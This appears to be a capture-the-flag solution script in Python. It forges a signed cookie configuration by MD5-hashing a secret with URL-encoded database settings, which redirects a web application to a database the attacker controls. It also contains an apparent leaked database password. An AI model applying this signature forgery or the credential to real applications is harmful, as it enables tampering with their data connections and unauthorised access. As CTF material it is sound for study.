"""
Here you could modify the cookie to connect to the sql database you wanted.
You had to generate the sig to that it accepts the config.
I created a sql database myself, modified the cookie with a chromium extension,
then, just make the query with the form given. With this script you fill the
config variables with the ones you want, and then it creates the text for the
cookie
"""
import hashlib
import urlparse
import urllib

DB_NAME='db'
DB_HOST='host'
DB_USER='user'
DB_PASSWD='passwd'
SECRET = 'x'


def parse_config(config):
    return urlparse.parse_qs(urlparse.unquote(config))


def main():
    quoted = urllib.quote('app_name=hsl&db_name=hsl&db_user=hsl&db_passwd=CBXN2a@-Q_aV@7D_&db_host=localhost')
    quoted = urllib.quote('db_name={0}&db_host={1}&db_user={2}&db_passwd={3}'.format(DB_NAME,
                                                                                     DB_HOST,
                                                                                     DB_USER,
                                                                                     DB_PASSWD))
    sig = hashlib.md5(SECRET + quoted.lower()).hexdigest()
    print('config: {0}'.format(quoted))
    print('sig: {0}'.format(sig))


if __name__ == "__main__":
    main()
